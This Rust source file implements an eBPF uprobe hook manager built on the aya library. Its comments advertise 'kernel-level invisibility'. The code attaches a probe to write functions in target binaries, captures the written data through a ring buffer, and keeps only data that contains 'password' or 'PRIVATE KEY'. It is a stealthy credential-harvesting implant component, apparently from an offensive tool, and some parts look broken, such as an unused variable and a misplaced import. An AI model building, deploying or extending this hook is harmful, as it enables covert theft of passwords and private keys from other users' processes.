// eBPF Kernel-Level Hooking Implementation
// Uses aya-rs for Rust-based eBPF programs
// Provides kernel-level invisibility - no LD_PRELOAD required

use std::sync::Arc;
use tokio::sync::mpsc;

#[cfg(feature = "ebpf")]
mod ebpf_impl {
    use super::*;
    use aya::{
        programs::{Uprobe, UprobeLink},
        util::online_cpus,
        Bpf, BpfLoader,
    };
    use std::collections::HashMap;

    pub struct EbpfHookManager {
        bpf: Bpf,
        uprobes: HashMap<String, Vec<UprobeLink>>,
        active: Arc<std::sync::atomic::AtomicBool>,
    }

    impl EbpfHookManager {
        /// Create a new eBPF hook manager
        pub fn new() -> Result<Self, String> {
            // Load the eBPF program
            // The eBPF bytecode is compiled at build time by build.rs
            use std::env;
            
            // Try multiple locations for eBPF bytecode
            let ebpf_bytes = std::fs::read("target/bpf/protosyte_hook.bpf.o")
                .or_else(|_| {
                    // Fallback to OUT_DIR (where build.rs puts it)
                    let out_dir = env::var("OUT_DIR")
                        .unwrap_or_else(|_| "target/debug/build".to_string());
                    std::fs::read(format!("{}/protosyte_hook.bpf.o", out_dir))
                })
                .map_err(|_| {
                    "eBPF bytecode not found. Ensure:\n".to_string() +
                    "  1. Build with --features ebpf\n" +
                    "  2. clang and libbpf-dev are installed\n" +
                    "  3. Check build output for eBPF compilation errors\n" +
                    "  4. Run 'make check-ebpf' to verify dependencies"
                })?;
            
            let mut bpf = BpfLoader::new()
                .load(&ebpf_bytes)
                .map_err(|e| format!("Failed to load eBPF program: {}", e))?;

            // Get the ring buffer map
            let mut ring_buffer = bpf
                .map_mut("ringbuf")
                .ok_or("Ring buffer map not found")?
                .try_into()
                .map_err(|e| format!("Failed to get ring buffer: {:?}", e))?;

            Ok(Self {
                bpf,
                uprobes: HashMap::new(),
                active: Arc::new(std::sync::atomic::AtomicBool::new(true)),
            })
        }

        /// Attach uprobe to a function in a binary
        pub fn attach_uprobe(
            &mut self,
            binary_path: &str,
            function_name: &str,
            offset: u64,
        ) -> Result<(), String> {
            // Get the uprobe program from the BPF object
            let program: &mut Uprobe = self
                .bpf
                .program_mut("hook_write")
                .ok_or("uprobe program not found")?
                .try_into()
                .map_err(|e| format!("Failed to get uprobe program: {:?}", e))?;

            // Load the program into the kernel
            program
                .load()
                .map_err(|e| format!("Failed to load uprobe: {}", e))?;

            // Attach to the function (uprobe attaches once, not per-CPU)
            // Note: aya uprobes attach globally, not per-CPU
            let link = program
                .attach(u64::from(0), Some(function_name), offset, Some(binary_path))
                .map_err(|e| format!("Failed to attach uprobe: {}", e))?;

            let mut links = Vec::new();
            links.push(link);

            self.uprobes
                .insert(format!("{}:{}", binary_path, function_name), links);

            Ok(())
        }

        /// Start reading from the ring buffer and forwarding to channel
        pub async fn start_capture(&self, tx: mpsc::UnboundedSender<Vec<u8>>) {
            use aya::maps::RingBuf;

            let mut ring_buffer: RingBuf<_> = self
                .bpf
                .map_mut("ringbuf")
                .unwrap()
                .try_into()
                .unwrap();

            // Poll the ring buffer for events
            while self.active.load(std::sync::atomic::Ordering::Relaxed) {
                // Read from ring buffer (non-blocking)
                ring_buffer.poll(Duration::from_millis(100)).await;

                // Process available data
                while let Ok(data) = ring_buffer.next() {
                    if let Some(filtered) = self.filter_data(&data) {
                        let _ = tx.send(filtered);
                    }
                }

                tokio::time::sleep(Duration::from_millis(10)).await;
            }
        }

        fn filter_data(&self, data: &[u8]) -> Option<Vec<u8>> {
            // Apply pattern filtering
            if let Ok(text) = std::str::from_utf8(data) {
                // Check for sensitive patterns
                if text.contains("password") || text.contains("PRIVATE KEY") {
                    return Some(data.to_vec());
                }
            }
            None
        }

        /// Detach all uprobes
        pub fn detach_all(&mut self) {
            self.uprobes.clear();
        }
    }

    impl Drop for EbpfHookManager {
        fn drop(&mut self) {
            self.detach_all();
        }
    }
}

// Public API
#[cfg(feature = "ebpf")]
pub use ebpf_impl::EbpfHookManager;

#[cfg(not(feature = "ebpf"))]
pub struct EbpfHookManager;

#[cfg(not(feature = "ebpf"))]
impl EbpfHookManager {
    pub fn new() -> Result<Self, String> {
        Err("eBPF feature not enabled. Build with --features ebpf".to_string())
    }
}

use tokio::time::Duration;

